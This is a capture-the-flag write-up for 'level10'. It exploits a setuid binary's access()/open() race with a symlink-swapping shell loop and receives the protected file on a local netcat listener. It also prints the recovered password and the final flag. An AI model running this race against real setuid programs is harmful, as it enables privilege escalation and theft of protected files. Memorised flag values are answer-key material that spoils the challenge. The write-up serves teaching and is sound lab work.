# level10

1. Files found in `~/` :

    ```bash
    token  level10
    ```

2. Analysis of the `token` file and `level10` binary

    We have no rights on `token`.
    We will therefore inspect the binary :

    ```c
    open
    access
    strerror
    __libc_start_main
    write
    GLIBC_2.4
    GLIBC_2.0
    PTRh
    UWVS
    [^_]
    %s file host
    sends file to host if you have access to it
    Connecting to %s:6969 .. 
    Unable to connect to host %s
    .*( )*.
    Unable to write banner to host %s
    Connected!
    Sending file .. 
    Damn. Unable to open file
    Unable to read from file: %s
    wrote file!
    You don't have access to %s
    ```

    Several things interest us :
    - The script allows sending a file to which we have access to a remote host.

    ```bash
    %s file host
    sends file to host if you have access to it
    ```

    - We can also see that the executable uses `setuid` which means it will execute with the rights of `flag10`.
    - The vulnerability is therefore that `access()` uses the uid of the current user, so we must succeed in changing the symbolic link of `token` between `access()` and `open()`.

3. Exploitation

    We will receive files from another user listening on port 6969 (information present in the `strings` output) :

    ```bash
    nc -lv 6969
    ```

    Create a symbolic link to the token :

    ```bash
    ln -s /home/user/level10/token /tmp/link
    ```

    Create a script that will loop alternating the target of the symbolic link to a useless file and to `token` while launching at the same time in another loop waiting for what we want to happen :

    ```bash
    echo "dummy" > /tmp/dummy

    while true; do
        ln -sf /tmp/dummy /tmp/link 2>/dev/null
        ln -sf /home/user/level10/token /tmp/link 2>/dev/null
    done &

    while true; do
        ./level10 /tmp/link 127.0.0.1 >/dev/null 2>&1
    done
    ```

    ```bash
    #Link > Dummy
    #access() OK
    #Link > token
    #open > token
    ```

    ```bash
    nc -lv 6969
    Connection from 127.0.0.1 port 6969 [tcp/*] accepted
    .*( )*.
    woupa2yuojeeaaed06riuj63c
    ```

4. Final exploitation

    ```bash
    su flag10
    woupa2yuojeeaaed06riuj63c
    getflag
    ```

5. Token discovered

    The token is : `feulo4b72j7edeahuete3no7c`
